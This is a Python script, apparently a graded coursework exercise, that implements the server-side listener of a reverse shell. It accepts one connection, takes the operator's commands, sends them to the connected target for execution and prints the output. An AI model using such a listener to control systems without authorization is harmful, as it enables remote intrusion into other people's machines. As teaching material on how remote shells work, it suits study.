import socket
from shared import server_ip, server_port
def main():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket object to the IP and port
    server_socket.bind((server_ip, server_port))

    # 1. Accept only one connection at a time. [1 Mark]
    #     a. Implement functionality in the server script to handle one connection at
    #         any given time.

    server_socket.listen(1)
    print("server listening on {}:{}".format(server_ip, server_port))
    client_socket, client_address = server_socket.accept()

    
    # 2. Print a success message when a connection is received [1 Mark]
    #     a. Upon successfully establishing a connection, the server should display a
    #     confirmation message.
    print("server accepted connection from {}:{}".format(client_address[0], client_address[1]))


        
    while True:
        # 3. Allows the user to enter commands to be executed on the target [2 Marks]
    #     a. Implement a feature that reads input from the server-side user and
    #     sends these commands to the connected client for execution.
        command = input("Enter command to execute on the client: ")
        command = command.strip()

        # Send the command to the server
        client_socket.send(command.encode())

        # Receive the command output from the server
        output = client_socket.recv(4096).decode()

        # Print the command output
        print(output)

#         4. Allows user to terminate shell by typing "end" [1 Mark]
# a. Implement a feature that gracefully terminates the reverse shell session
# when the server-side user types "end."
        if command == 'end':
            break

    # Close the connection
    server_socket.close()

if __name__ == "__main__":
    main()
